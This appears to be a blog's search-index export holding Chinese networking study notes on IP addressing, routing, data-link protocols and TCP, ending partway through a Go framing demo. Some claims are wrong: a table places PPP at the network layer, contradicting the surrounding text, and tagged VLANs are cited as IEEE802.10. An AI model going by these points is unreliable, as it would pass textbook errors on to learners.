广播的IP包以数据链路的帧的形式发送时,得通过 MAC 地址为全 1 比特的 FF:FF: FF: FF: FF: FF转发。\n本地广播 在本网络内的广播叫做本地广播。例如网络地址为192.168.0.0/24 的情况下,广播地址是192.168.0.255。因为这个广播地址的 IP包会被路由器屏蔽,所以不会到达192.168.0.0/24 以外的其他链路上。\n直接广播 在不同网络之 的广播叫做直接广播。例如网络地址为192.168.0.0/24的主机向 192.168.1.255/24 的目标地址发送IP 包。收到这个包的路由器,将数据转发给192.168.1.0/24,从而使得所有192.168.1.1~ 192. 168.1.254 的主机都能收到这个包”\nIP多播 多播用于将包发送给特定组内的所有主机。由于其直接使用IP 协议,因此也不存在可靠传输。 多播使用D类地址。因此,如果从首位开始到第4位是“1110”,就可以认为是多播地址。而剩下的28 位可以成为多播的组编号。 从224.0.0.0到 239.255.255.255 都是多播地址的可用范围。其中从224.0.0.0到224.0.0.255 的范围不需要路由控制,在同一个链路内也能实现多播。而在这个范围之外设置多播地址会给全网所有组内成员发送多播的包。\n利用IP多播实现通信,除了地址外还需要IGMP\u0026rsquo;等协议的支持。 子网掩码 例： A类 255.0.0.0 B类255.255.0.0 C类 255.255.255.0\n网络标识相同的计算机必须同属于同一个链路。例如,架构B类IP 网络时, 理论上一个链路内允许6万5千多台计算机连接。然而,在实际网络架构当中, 一般不会有在同一个链路上连接6万5千多台计算机的情况。因此,这种网络结构实际上是不存在的。\n因此,直接使用A类或B类地址,确实有些浪费。随着互联网的覆盖范围逐渐增大,网络地址会越来越不足以应对需求,直接使用A类、B类、C类地址就更加显得浪费资源。为此,人们已经开始一种新的组合方式以减少这种浪费。\n对于子网掩码,目前有两种表示方式。以172.20.100.52的前26位是网络地址的情况为例,以下是其中一种表示方法,它将IP地址与子网掩码的地址分别用两行来表示。 另一种表示方式如下所示。它在每个 IP 地址后面追加网络地址的位数”用“/”隔开 CIDR 采用任意长度分割 IP 地址的网络标识和主机标识。这种方式叫做CIDR 根据 CIDR,连续多个C类地址”就可以划分到一个较大的网络内。CIDR 更有效地利用了当前 IPv4地址,同时通过路由集中“降低了路由器的负担。 VLSM 在CIDR被应用到互联网的初期,网络内部采用固定长度的子网掩码机制。也就是说,当子网掩码的长度被设置为/25以后,域内所有的子网掩码都得使用同样的长度。然而,有些部门可能有500台主机,另一些部门可能只有50台主机。如果全部采用统一标准,就难以架构一个高效的网络结构。为此人们提出组织内要使用可变长度的、高效的IP地址分配方式。\n于是产生了一种可以随机修改组织内各个部门的子网掩码长度的机制VLSM(可变长子网掩码)。它可以通过域间路由协议转换为 RIP2 以及 OSPF实现。根据 VLSM 可以将网络地址划分为主机数为500个时子网掩码长度为/23,主机数为50个时子网掩码长度为/26。\n有了 CIDR 和 VLSM技术,确实相对缓解了全局IP地址不够用的问题。但是IP 地址的绝对数本身有限的事实无法改变。\n全局地址与私有地址 出现了一种新技术。它不要求为每一台主机或路由器分配一个固定的IP 地址,而是在必要的时候只为相应数量的设备分配唯一的IP地址。 尤其对于那些没有连接互联网的独立网络中的主机,只要保证在这个网络内地址唯一,可以不用考虑互联网即可配置相应的IP地址。\n私有网络的IP 地址。它的地址范围如下所示: A类~C类范围中除去0/8、127/8。 包含在这个范围内的IP地址都属于私有 IP,而在此之外”的IP地址称为全局IP。 全局 IP地址基本上要在整个互联网范围内保持唯一\u0026rsquo;,但私有地址不需要。只要在同一个域里保证唯一即可。在不同的域里出现相同的私有IP 不会影响使用。\n在世界范围内,全局 IP 由ICANN\u0026lsquo;进行管理。对于 FTTH 和 ADSL 的服务,网络提供商直接给用户分配全局 IP地址,并且用户每次重连该IP地址都可能会发生变化。这时的IP 地址由提供商维护,不需要用户亲自申请全局 IP 地址。\n不过现在,普遍采用的一种方式是,在LAN 中设置私有地址,通过少数设置全局IP 地址的代理服务器结合 NAT的设置进行互联网通信。这时 IP地址个数就不限于LAN 中主机个数而是由代理服务器和 NAT的个数决定。\nNAT 私有IP 最早没有计划连接互联网,而只用于互联网之外的独立网络。然而, 当一种能够互换私有 IP 与全局IP 的NAT\u0026rsquo;技术诞生以后,配有私有地址的主机与配有全局地址的互联网主机实现了通信。 私有IP 地址结合NAT技术已成为现在解决 IP地址分配问题的主流方案。它与使用全局 IP 地址相比有各种限制。 WHOIS 互联网中从很早开始就可以通过网络信息查询机构和管理人联系方式。这种方法就叫做 WHOIS。WHOIS 提供查询IP地址、AS编号以及搜索域名分配登记和管理人信息的服务。\n路由控制 发送数据包时所使用的地址是网络层的地址,即IP地址。然而仅仅有IP地址还不足以实现将数据包发送到对端目标地址,在数据发送过程中还需要类似于“指明路由器或主机”的信息,以便真正发往目标地址。保存这种信息的就是路由控制表(Routing Table)。\n该路由控制表的形成方式有两种:一种是管理员手动设置,另一种是路由器与其他路由器相互交换信息时自动刷新。前者也叫静态路由控制,而后者叫做**动态路由控制\nIP协议始终认为路由表是正确的。然而,IP 本身并没有定义制作路由控制表的协议。即 IP没有制作路由控制表的机制。该表是由一个叫做“路由协议”(这个协议有别于IP)的协议制作而成。 路由控制表 路由控制表中记录着网络地址与下一步应该发送至路由器的地址。在发送IP 包时,首先要确定IP 包首部中的目标地址,再从路由控制表中找到与该地址具有相同网络地址的记录,根据该记录将IP 包转发给相应的下一个路由器。如果路由控制表中存在多条相同网络地址的记录,就选择一个最为吻合的网络地址。所谓最为吻合是指相同位数最多的意思”\n如果路由表中下一个路由器的位置记录着某个主机或路由器网卡的IP地址,那就意味着发送的目标地址属于同一个链路。\n默认路由 如果一张路由表中包含所有的网络及其子网的信息,将会造成无端的浪费。这时,默认路由(Default Route)是不错的选择。默认路由是指路由表中任何一个地址都能与之匹配的记录。\n默认路由一般标记为 0.0.0.0/0或 defaul \u0026lsquo;。这里的0.0.0.0/0并不是指 IP 地址是0.0.0.0。由于后面是“/0”,所以并没有标识 IP 地址。它只是为了避免人们误以为0.0.0.0是IP地址。有时默认路由也被标记为 default,但是在计算机内部和路由协议的发送过程中还是以0.0.0.0/0进行处理。\n主机路由 “IP 地址/32”也被称为主机路由(Host Route)。例如,192.168.153.15/32就是一种主机路由。它的意思是整个 IP地址的所有位都将参与路由。 主机路由多被用于不希望通过网络地址路由的情况。\n环回地址 环回地址是在同一台计算机上的程序之间进行网络通信时所使用的一个默认地址。计算机使用一个特殊的IP地址127.0.0.1作为环回地址。与该地址具有相同意义的是一个叫做localhost 的主机名。使用这个 IP 或主机名时,数据包不会流向网络。\n路由控制表的聚合 利用网络地址的比特分布可以有效地进行分层配置。对内即使有多个子网掩码,对外呈现出的也是同一个网络地址。这样可以更好地构建网络,通过路由信息的聚合可以有效地减少路由表的条目”。 ","date":"2023-10-18T19:25:30+08:00","permalink":"https://anonymity-0.github.io/posts/%E7%BD%91%E7%BB%9C%E5%B1%82/","title":"网络层"},{"content":"数据链路层 数据链路是让互联计算机之间相互通信的一种协议,又指通信手段。 数据链路的段 数据链路的段是指一个被分割的网络。然而根据使用者不同,其含义也不尽相同。例如,引入中继器将两条网线相连组成一个网络。 这种情况下有两条数据链路: ◎从网络层的概念看,它是一个网络(逻辑上)一即,从网络层的立场出发,这两条网线组成一个段。 ◎从物理层的概念看,两条网线分别是两个物体(物理上)一即, 从物理层的观.点出发,一条网线是一个段。 网络拓扑 网络的连接和构成的形态称沟网络拓扑(Topology)。网络拓扑包括总线型、环型、星型、网状型等。拓扑一词不仅用于直观可见的配线方式上,也用于逻辑上网络的组成结构。两者有时可能会不一致。而目前实际的网络都是由这些简单的拓扑结构错综复杂地组合而成的。 MAC MAC地址用于识别数据链路中互连的节点。 MAC 地址长48 比特。在使用网卡(NIC)的情况下, MAC地址一般会被烧人到 ROM 中。因此,任何一个网卡的MAC地址都是唯一的,在全世界都不会有重复”。 注： 例外情况—MAC地址不一定是唯一的在全世界,MAC地址也并不总是唯一的。实际上,即使 MAC地址相同,只要不是同属一个数据链路就不会出现问题。 例如,人们可以在微机板上自由设置自己的MAC地址。再例如,一台主机上如果启动多个虚拟机,由于没有硬件的网卡只能由虚拟软件自己设定 MAC地址给多个虚拟网卡,这时就很难保证所生成的MAC地址是独一无二的了。 但是,无论哪个协议成员通信设备,设计前提都是 MAC地址的唯一性。这也可以说是网络世界的基本准则。 根据 MAC地址转发 以太网交换机就是持有多个端口”的网桥。它们根据数据链路层中每个帧的目标MAC地址,决定从哪个网络接口发送数据。这时所参考的、用以记录发送接口的表就叫做转发表(Forwarding Table)。 这种转发表的内容不需要使用者在每个终端或交换机上手工设置,而是可以自动生成。数据链路层的每个通过点在接到包时,会从中将源MAC地址以及曾经接收该地址发送的数据包的接口作为对应关系记录到转发表中。 以某个 MAC地址作为源地址的包由某一接口接收,实质上可以理解为该MAC地址就是该接口的目标。因此也可以说,以该 MAC地址作为目标地址的包,经由该接口送出即可。这一过程也叫自学过程。 交换机转发方式 存储转发 存储转发方式检查以太网数据帧末尾的 FCS\u0026rsquo;位后再进行转发。因此,可以避免发送由于冲突而被破坏的帧或噪声导致的错误帧。\n直通转发 直通转发方式中不需要将整个帧全部接收下来以后再进行转发。只需要得知目标地址即可开始转发。因此,它具有延迟较短的优势。但同时也不可避免地有发送错误帧的可能性。\n共享介质型网络 共享介质型网络指由多个设备共享一个通信介质的一种网络。最早的以太网和FDDI 就是介质共享型网络。在这种方式下,设备之间使用同一个载波信道进行发送和接收。为此,基本上采用半双工通信方式,并有必要对介质进行访问控制。\n争用方式 争用方式(Contention)是指争夺获取数据传输的权力,也叫 CSMA(载波监听多路访问)。这种方法通常令网络中的各个站”采用先到先得的方式占用信道发送数据,如果多个站同时发送帧,则会产生冲突现象。也因此会导致网络拥堵与性能下降。 CSMA/CD 在一部分以太网当中,采用了改良 CSMA 的另一种方式-CSMA/CD 方式。CSMA/CD 要求每个站提前检查冲突,一旦发生冲突,则尽早释放信道。其具体工作原理如下: 如果载波信道上没有数据流动,则任何站都可以发送数据。\n检查是否会发生冲突。一旦发生冲突时,放弃发送数据”,同时立即释放载波信道。 放弃发送以后,随机延时一段时间,再重新争用介质,重新发送帧。 令牌传递方式 令牌传递方式是沿着令牌环发送一种叫做“令牌”的特殊报文,是控制传输的一种方式。只有获得令牌的站才能发送数据。这种方式有两个特点:一是不会有冲突,二是每个站都有通过平等循环获得令牌的机会。因此,即使网络拥堵也不会导致性能下降。 当然,这种方式中,一个站在没有收到令牌前不能发送数据帧,因此在网络不太拥堵的情况下数据链路的利用率也就达不到100%\n非共享介质网络 非共享介质网络是指不共享介质,是对介质采取专用的一种传输控制方式。在这种方式下,网络中的每个站直连交换机,由交换机负责转发数据帧。\n该方式还可以根据交换机的高级特性构建虚拟局域网(VLAN,Virtual LAN)、进行流量控制等。当然,这种方式也有一个致命的弱点,那就是一旦交换机发生故障,与之相连的所有计算机之间都将无法通信。\n全双工通信 它允许在同一时间既可以发送数据也可以接收数据。类似于电话,接打双方可以同时说话。 同样是以太网,在使用交换机与双绞线电缆(亦或光纤电缆) 的情况下,既可以通过交换机的端口与计算机之间进行一对一的连接,也可以通过相连电缆内部的收发线路”分别进行接收和发送数据。因此,交换机的端口与计算机之间可以实现同时收发的全双工通信。 环路检测技术 通过网桥连接网络时,一旦出现环路该如何处理?这与网络的拓扑结构和所使用的网桥种类有直接关系。最坏的情况下,数据顿会在环路中被一而再再而三地持续转发。而一旦这种数据帧越积越多将会导致网络瘫痪。\n生成树方式 该方法由 IEEE802.1D定义。每个网桥必须在每1~10秒内相互交換 BPDU (Bridge Protocol Data Unit)包,从而判断哪些端口使用哪些不使用,以便消除环路。一旦发生故障,则自动切换通信线路,利用那些没有被使用的端口继续进行传输。\n源路由法 源路由法最早由TBM 提出,以解决令牌环”网络的问题。该方式可以判断发送数据的源地址是通过哪个网桥实现传输的,并将帧写人 RIF(Routing Information Field)。网桥则根据这个 RIF 信息发送帧给目标地址。因此,即使网桥中出现了环路,数据帧也不会被反复转发,可成功地发送到目标地址。在这种机制中发送端本身必须具备源路由的功能。\nVLAN 进行网络管理的时候,时常会遇到分散网络负载、变换部署网络设备的位置等情况。而有时管理员在做这些操作时,不得不修改网络的拓扑结构,这也就意味着必须进行硬件线路的改造。然而,如果采用带有 VLAN 技术的网桥,就不用实际修改网络布线,只需修改网络的结构即可。 注意：VLAN 是基于以太网的一种技术，它使用 VLAN 标签将数据帧划分到不同的逻辑网段。\n交换机按照其端口区分了多个网段,从而区分了广播数据传播的范围、减少了网络负载并提高了网络的安全性。然而异构的两个网段之间,就需要利用具有路由功能的交换机(如3层交换机), 或在各段中间通过路由器的连接才能实现通信。 对这种 VLAN 进行了扩展,又定义了 IEEE802.10 的标准(也叫 TAG VIAN),该标准允许包含跨越异构交换机的网段。TAG VLAN 中对每个网段都用一个 VLAN ID 的标签进行唯一标识。在交换机中传输帧时,在以太网首部加人这个 VID 标签,根据这个值决定将数据帧发送给哪个网段。 以太网 在众多数据链路中最为著名、使用最为广泛的莫过于以太网(Ethernet)”。它的规范简单,易于 NIC(网卡)及驱动程序实现。\n在以太网普及之初,一般采用多台终端使用同一根同轴电缆的共享介质型\u0026rsquo; 连接方式。 而现在,随着互连设备的处理能力以及传输速度的提高,一般都采用终端与交换机之间独占电缆的方式实现以太网通信 以太网的分类 10BASE 中的“10”、100BASE 中的“100”、1000BASE 中的“1000”以及10CBASE 中的“10G”分别指10Mbps、100Mbps、IGbps 以及 10Gbps 的传输速度。 而追加于后面的“5”、“2”、“T”、“F”等字符表示的是传输介质。 以太网帧格式 [[#以太网]]帧前端有一个叫做前导码(Preamble)的部分,它由0、1数字交替组合而成,表示一个以太网帧的开始,也是对端网卡能够确保与其同步的标志。 前导码末尾是一一个叫做 SFD (Start Frame Delimiter)的域,它的值是“11”。在这个域之后就是以太网帧的本体(图3.20)。前导码与SFD 合起来占8个字节”。 以太网帧本体的前端是以太网的首部,它总共占14个字节。分别是6个字节的目标 MAC地址、6个字节的源MAC地址以及2个字节的上层协议类型。 IEEE802.3 Ethernet 与一般的以太网在帧的首部上稍有区别。一般以太网帧中表示类型的字段,在 IEEE802.3以太网中却表示帧的长度。 紧随帧头后面的是数据。一个数据帧所能容纳的最大数据范围是 46~1500个字节。帧尾是一个叫做 FCS(Ftame Check Sequence,帧检验序列)的4个字节。它可以检查帧是否有所损坏。在通信传输过程中如果出现电子嗓声的干扰,可能会影响发送数据导致乱码位的出现。 在目标 MAC地址中存放了目标工作站的物理地址。源MAC地址中则存放构造以太网帧的发送端工作站的物理地址。\n[[#VLAN]]中,帧的格式又会有所变化 无线通信 无线通信,依据通信距离可分为如表3.3所列出的类型。IEEE802 委员会制定了无线PAN\u0026rsquo;(802.15)、无线 LAN\u0026rsquo;(802. 11)、无线 MAN\u0026rsquo;(802.16)以及无线 RAN\u0026rsquo;(802.22)等无线标准。无线 WAN\u0026rsquo;的最典型代表就是手机通信。手机通过基站能够实现长距离通信。\n无线LAN 允许使用者可以自由地移动位置、自由地放置设备,通过无线电波实现较广范围的通信。这也意味着,在其通信范围内,任何人都可以使用该无线LAN,因此会有被盗听或篡改的危险。 此外,无线LAN 可以无需牌照使用特定频段。因此无线IAN 的无线电波可能会收到其他通信设备的干扰,导致信号不稳定。例如在一台微波炉附近使用一个2.4GHz带宽的802.11b/g设备就得需要注意。微波炉启动后的放射出来的无线电波与设备频率相近,产生的干扰可能会显著地降低设备的传输能力。\nIEEE802.11 IEEE802.11定义了无线LAN 协议中物理层与数据链路层的一部分(MAC 层)。IEEE802.11 这个编号有时指众多标准的统称,有时也指无线LAN 的一种通信方式。 IEEE802.11 是所有IEEE802.11 相关标准的基础。其中定义的数据链路层的一部分(MAC层)适用于所有IEEE802.11 的其他标准。\nMAC层中物理地址与以太网相同,都使用MAC地址,而介质访问控制上则使用CSAM/CD 相似的CSAM/ CA方式。通常采用无线基站并通过高基站实现通信。\nCSMA/ CA CSMA/CA协议中，当一个站点要发送数据时，它会先发送一个RTS（请求发送）帧给接收方。接收方收到RTS帧后，会回复一个CTS（清除发送）帧。只有在接收方回复CTS帧后，发送方才能发送数据。这样可以避免多个站点同时发送数据导致的冲突。\nCSMA/CD和CSMA/区别\n特征 CSMA/CD CSMA/CA 有效性 发生冲突后生效 防止冲突发生 用途 有线网络 无线网络 功能 减少恢复时间 最小化冲突可能性 数据帧重传 发生冲突时重传数据帧 先发送数据传输意图，再发送数据 标准 802.3标准 802.11标准 WIFI Wi-Fi是 WECA(Wireless Fthernet Compatability Alliance,无线以太网兼容性联盟)为普及 IEEE802.11 的各种标准而打造的一个品牌名称。\n蓝牙 蓝牙与 IEEE802.11b/g 类似,是使用2.4GHz 频率无线电波的一种标准”。数据传输速率在 V2 中能达到3Mbps(实际最大吞吐量为2.1Mbps)。通信距离根据无线电波的信号的强弱,有1m、10m、100m 三种类型。通信终端最多允许8台设备。\nZigBee ZieBee 主要应用于家电的远程控制”,是一种短距离、低功耗的无线通信技术。它最多允许65536 个终端之间互连通信。ZigBee 的传输速度随着所使用的频率有所变化。但在日本,使用2.4GHz 频率的设备最高可达250kpbs®。\nPPP PPP(Point-to-Point Protocol)是指点对点,即1对1连接计算机的协议。 在理论上，PPP 协议属于网络层。在实际应用中，PPP 协议通常用于在数据链路层上使用。\nPPP 属于纯粹的数据链路层,与物理层没有任何关系。换句话说,仅有PPP 无法实现通信,还需要有物理层的支持。 PPP可以使用电话线或ISDN、专线、ATM 线路。此外,近些年人们更多是在用 ADSL 或有线电视通过 PPPoE (PPP over Ethernet)实现互联网接人。PPPOE 是在以太网的数据中加入 PPP 帧进行传输的一种方式。\nPPP和以太网的区别\n特征 PPP 以太网 层 网络层 链路层 作用 建立点对点连接 在多个设备之间共享介质 封装 封装 IP 数据包 不封装 使用场景 远程访问、拨号连接 局域网、广域网 在PPP的主要功能中包括两个协议:一个是不依赖上层的LCP 协议(Link Control Protocol),另一个是依赖上层的 NCP 协议(Network Control Protocol)。如果上层为IP,此时的 NCP 也叫做 IPCP (IP Control Protocol)。 LCP LCP 主要负责建立和断开连接、设置最大接收单元(MRU,Maximum Receive Unit)、设置验证协议(PAP 或CHAP)以及设置是否进行通信质量的监控。\nNCP 而 IPCP 则负责IP 地址设置以及是否进行 TCP/IP 首部压缩等设备”。\n通过PPP连接时,通常需要进行用户名密码的验证,并且对通信两端进行双方向的验证。其验证协议有两种,分别为PAP(Password Authentication Protocol) 和 CHAP(Challenge Handshake Authentication Protocol)。\nPAP PAP是PPP连接建立时,通过两次握手进行用户名和密码验证。其中密码以明文方式传输。因此一般用于安全要求并不很高的环境,否则会有窃听或盗用连接的危险。\nCHAP CHAP 则使用一次性密码 OTP(One Time Password),可以有效防止窃听。此外,在建立连接后还可以进行定期的密码交换,用来检验对端是否中途被替换。\nPPP 的帧格式 PPP 的数据帧格式如图3.26所示。其中标志码用来区分每个帧。这一点与HDLC\u0026rsquo;协议非常相似,因为PPP本身就是基于 HDIC制定出来的一种协议。 HDLC HDLC 就是在每个帧的前后加上一个8位字节“01111110”用来区分帧。这一个8位字节叫做标志码。 在两个标志码中间不允许出现连续6个以上的“1”。因此,在发送帧的时候,当出现连续5个“1”时后面必须插人一个0。而当接收端在接收帧时,如果收到连续的5个“1”且后面跟着的是0,就必须删除。由于最多只会出现5个连续的“1”,就可以比较容易地通过标志码区分帧的起始与终止。而PPP标准帧格式与此完全相同。\n另外,在通过电脑进行拨号时,PPP 已在软件中实现。因此,那些插人或删除“0”的操作或FCS 计算都交由电脑的CPU 去处理。这也是为什么人们常说PPP这种方式会给计算机带来大量负荷的原因所在。\nPPPoE 在这种互联网接入服务中,通信线路由以太网模拟。由于以太网越来越普及, 在加上它的网络设备与相应的NIC价格比较便宜,因而ISP 能够提供一个单价更低的互联网接人服务。 单纯的以太网没有验证功能,也没有建立和断开连接的处理,因此无法按时计费。而如果采用PPPoE 管理以太网连接,就可以利用 PPP的验证等功能使各家ISP 可以有效地管理终端用户的使用。 ATM ATM(Asynchronous Transfer Mode)是以一个叫做信元(5字节首部加48字节数据)的单位进行传输的数据链路,由于其线路占用时间短和能够高效传输大容量数据等特点主要用于广域网络的连接。\nATM 是面向连接的一种数据链路。因此在进行通信传输之前一定要设置通信线路。而ATM又与传统电话不同,它允许同时与多个对端建立通信连接。\nATM中没有类似以太网和FDDI那种发送权限的限制。它允许在任何时候发送任何数据。因此,当大量计算机同时发送大量数据时容易引发网络拥堵甚至使网络进入收敛状态”。为了防止这一现象的出现,ATM 中也增加了限制带宽的细分功能\n注：收敛状态指当网络非常拥堵时,路由器或交换机无法完成包的处理,从而丢弃这些包的一种状态。\nATM扩展了 TDM,能够有效地提高线路的利用率\u0026rsquo;。ATM 在 TDM 的时隙中放入数据时,并非按照线路的顺序而是按照数据到达的顺序放入。 为此,发送端还需要附加一个5字节的包首部,包含 VPI(Virtual Path Identifier)、VCI (Virtual Channel Identifier)等识别码”用来标识具体的通信类型。这种VPI 与VCI的值只在直连通信的两个ATM交换机之间设置。在其他交换机之间意思则完全不同。 ATM中信元传输所占用的时隙不固定,一个帧所占用的时隙数也不固定,而且时隙之间并不要求连续。这些特点可以有效减少空闲时隙, 从而提高线路的利用率。只不过需要额外附加5个字节的首部,增加了网络的开销”,因此也在一定程度上降低了通信速度。\n在以太网中一个帧最大可传输1500个字节,FDDI 可以最大传输 4352字节。 而ATM 的一个信元却只能发送固定的48字节数据。这48个字节的数据部分中若包含IP 首部和TCP首部则基本无法存放上层的数据。为此,一般不会单独使用ATM,而是使用上层的AAL(ATM Adapter Layer)。 在上层为IP 的情况下,则叫做 AAIS。每个IP包被附加各层的协议首部以后,最多可以被分为192个信元发送出去。 从这个图中还可以看出,在整个192个信元中只要有一个丢失,那么整个IP 包就相当于被损坏。此时,AAL5 的帧检查位报错,导致接收端不得不丢弃所有的信元。前面曾提到 TCP/IP 在包发生异常的时候可以实现重发,因此在 ATM网中即使只是一个信元丢失,也要重新发送最多192个信元。这也是ATM到目前为止的最大弊端。一且在网络拥堵的情况下,只要丢掉哪怕1%的信元也会导致整个数据都无法接收。特别是由于 ATM 没有发送权限上的控制,很容易导致网络收敛。\nPOS POS (Packet over SDH/SONET)是一种在 SDHY(SONET\u0026rsquo;)上进行包通信的一种协议。SDH(SONET)是在光纤上传输数字信号的物理层规范。\nFDDI FDDI(Fiber Distributed Data Interface)叫做分布式光线数据接口。曾几何时,人们为了用光纤和双绞线实现100Mbps 的传输速率,在主干网或计算机之间的高速连接上广泛使用了 FDDI。但是由于后来高速 LAN 提供了 Gbps 级的传输速率,FDDI 也就逐渐淡出了应用领域。 FDDI 采用令牌(追加令牌)环的访问方式。令牌环访问方式在网络拥堵的情况下极容易导致网络收敛。\n光纤通道 光纤通道(Fiber Channel)是实现高速数据通信的一种数据链路。与其说它是一种网络,不如说它更像是 SCSI那样类似于连接计算机周边设备的总线一样的规范。数据传输速率为 133Mbpx~4Gbps。近些年被广泛用于搭建SAN\u0026rsquo;,成为其主要数据链路。\nHDMI HDMI 是 High-Definition Multimedia Interface 的缩写,意为高清晰度多媒体接口。它可以通过一根缆线实现图像和声音等数字信号的高品质传输。曾主要用于DVD/蓝光播放器、录像机、AV 功放等设备与电视机、投影仪的连接,现在也逐渐开始用于计算机或平板电脑、数码相机与显示器的连接。从2009年发布的1.4 版开始它可以传输以太网帧,使得采用 HDMI介质实现 TCP/IP通信变为可能。\n公共网络 模拟电话线路 模拟电话线路其实就是利用固定电话线路进行通信。电话线中的音频带宽用于拔号上网。该方法不需要特殊的通信线路,完全使用已普及的电话网。 让计算机与电话线相连需要有一个将数字信号转换为模拟信号的调制解调器(俗称“猫”)。“猫”的传输速率一般只在56kbps 左右,所以现在已逐渐被淘汰。 （时代的眼泪）\nADSL ADSL’是对已有的模拟电话线路进行扩展的一种服务。模拟电话线路虽然也能传输高频数字通信,但是它与电信局的交换机之间只有发送音频信号时才能显示极好的传输效率,并会对其他多余频率的信号进行丢弃。\nADSL 正是利用话机到电信局交换机之间这段线路,附加一个叫做分离器的装置,将音频信号(低频信号)和数字信号(高频信号)隔离以免产生噪声干扰。\nFTTH FTTH(Fiber To The Home)顾名思义就是一根高速光纤直接连到用户家里或公司建筑物处的方法。它通过一个叫做ONU\u0026rsquo;的装置将计算机与之关连。该装置负责在光信号与电子信号之间的转换。使用FITH可以实现稳定的高速通信。不过它的线路传输速率与具体的服务内容仍受个别运营商限制。\n以上属于光纤到户。还有一种方式叫光纤到楼。它是指一个高速光纤直接连到某个大厦、公司或宾馆的大楼,随后在整个大楼内部再通过布线实现联网。简称FTTB(Fiber To The Building)。甚至还有一种方式是将光纤接人到某个家庭以后,再通过布线实现周围几户住家共同联网。这种方式简称为 FTIC (Fiber To The Curb\u0026rsquo;)。 有线电视 专线 随着互联网用户的急剧上升,专线服务向着价格更低、带宽更广以及多样化的方向发展。现在市面上已经出现了各种各样的“专线服务”。以NTT Group 的服务为例,有 Mega Data Nets(用 ATM 接口提供3Mbps42Mbps 的专线接人)、ATM Mega-Link、Giga Stream(用以太网或 SONET/SDH 接口提供 0.5Mbps135Mbps 的专线接人)等众多专线接入服务。\n专线的连接一定是一对一的连接。虽然 [[#ATM]] 的设计初衷允许有多个目标地, 但对于提供专线服务的ATMMega-Link中也只能指定一个目的地。因此不可能像ISDN 或帧中继那样引进一条线缆就能连接众多目的地。\nVPN 虚拟专用网络(VPN)用于连接距离较远的地域。这种服务包括 IP-VPN 和广域以太网。\nIP-VPN 意指在IP 网络(互联网)上建立 VPN。 网络服务商提供一种在 IP 网络上使用 MPIS 技术构建 VPN 的服务。其中MPLS(Multiprotocol Label Switching,多协议标签交换)在IP 包中附加一个叫做标签(Label\u0026rsquo;)的信息进行传输控制。每个用户的标签信息不同,因此在通过MPIS 网时,可以轻松地判断出目标地址。这样一来就可以将多个不同用户的VPN信息通过 MPLS 网加以区分,形成封闭的私有网络。此外,还能进行用户级的带宽控制。\nIPsec 除了使用服务提供商的 IP-VPN服务之外,有时企业还可以在互联网上建立自己的VPN\u0026rsquo;,一般采用的是 IPsec’技术。该方法对 VPN通信中的IP 包进行验证和加密,在互联网上构造一个封闭的私有网络。\n广域以太网 服务提供商所提供的用于连接相距较远的地域的一种服务。IP-VPN 是在IP 层面的连接,广域以太网则是在作为数据链路层的以太网上利用VLAN(虚拟局域网)实现 VPN的技术。该技术还可以使用 TCP/IP 中的其他协议。 广域以太网以企业专门使用服务提供商构建的 VLAN 网络为主要形式。只要指定同一个 VLAN,无论从哪里都能接入到同一个网络。\n公共无线 LAN 公共无线LAN 是指公开的可以使用[Wi-Fi]的服务。服务提供者可以在车站或餐饮店等人员相对比较集中的地方架设的一个叫做热点(HotSpot)的无线电波接收器。使用者到达这些区域就可以使用带有无线LAN网卡的笔记本电脑或智能手机连接上网。\n上网时使用者首先要通过这些热点建立互联网连接。连接以后,还可以通过那些利用 IPsec技术实现的VPN 连接到自己公司的内网。这种接人服务有时免费(如商场、车站等场所),有时也可能是收费的。 ","date":"2023-10-18T18:52:01+08:00","permalink":"https://anonymity-0.github.io/posts/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/","title":"数据链路层"},{"content":"网络基础知识 经典协议 TCP 为什么需要三次握手四次挥手 三次握手的最主要目的是保证连接是双工的，可靠更多的是通过重传机制来保证的。 因为连接是全双工的，双方必须都收到对方的FIN包及确认才可关闭。 为什么time_wait要等2msl TCP为什么需要流量控制 由于通讯双方，网速不同。通讯方任一方发送过快都会导致对方消息处理不过来，所以就需要把数据放到缓冲区中 如果缓冲区满了，发送方还在疯狂发送，那接收方只能把数据包丢弃。因此我们需要控制发送速率。 我们缓冲区剩余大小称之为接收窗口，用变量win表示。如果的win=0，则发送方停止发送。 TCP为什么需要拥塞控制 流量控制与拥塞控制是两个概念，拥塞控制是调解网络的负载。 接收方网络资源繁忙，因未及时相应ACK导致发送方重传大量数据，这样将会导致网络更加拥堵。 拥塞控制是动态调整win大小，不只是依赖缓冲区大小确定窗口大小。 为什么会出现粘包/拆包？ 应用程序写入的数据大于套接字缓冲区大小，这将会发生拆包。 应用程序写入数据小于套接字缓冲区大小，网卡将应用多次写入的数据发送到网络上，这将会发生粘包。 进行MSS（最大报文长度）大小的TCP分段，当TCP报文长度-TCP头部长度\u0026gt;MSS的时候将发生拆包。 接收方法不及时读取套接字缓冲区数据，这将发生粘包。 如何获取完整应用数据报文？ 使用带消息头的协议，头部写入包长度，然后再读取包内容。 设置定长消息，每次读取定长内容，长度不够时空位补固定字符。 设置消息边界，服务端从网络流中按消息边界分离出消息内容，一般使用\\n’。 更为复杂的协议，例如json、protobuf golang的tcp小demo 解码部分\n1package unpack 2 3import ( 4\t\u0026#34;encoding/binary\u0026#34; 5\t\u0026#34;errors\u0026#34; 6\t\u0026#34;io\u0026#34; 7) 8 9const MsgHeader = \u0026#34;12345678\u0026#34; 10 11// Encode 将消息编码为特定格式并写入 bytesBuffer 中。 12// 消息格式：消息头 + 消息长度 + 消息内容 13// 长度：消息头 8字节 + 消息长度 4字节 + 实际消息内容长度 contentLen 14func Encode(bytesBuffer io.Writer, content string) error { 15\t// 写入消息头 16\tif err := binary.Write(bytesBuffer, binary.BigEndian, []byte(MsgHeader)); err != nil { 17\treturn err 18\t} 19\t// 写入消息长度 20\tcontentLen := int32(len(content)) 21\tif err := binary.Write(bytesBuffer, binary.BigEndian, contentLen); err != nil { 22\treturn err 23\t} 24\t// 写入消息内容 25\tif err := binary.Write(bytesBuffer, binary.BigEndian, []byte(content)); err != nil { 26\treturn err 27\t} 28\treturn nil 29} 30 31// Decode 从 bytesBuffer 中读取并解码消息。 32// 返回消息内容的字节切片和可能的错误。 33func Decode(bytesBuffer io.Reader) (bodyBuf []byte, err error) { 34\tMagicBuf := make([]byte, len(MsgHeader)) 35\t// 1. 读取消息头 36\tif _, err = io.ReadFull(bytesBuffer, MagicBuf); err != nil { 37\treturn nil, err 38\t} 39\t// 2. 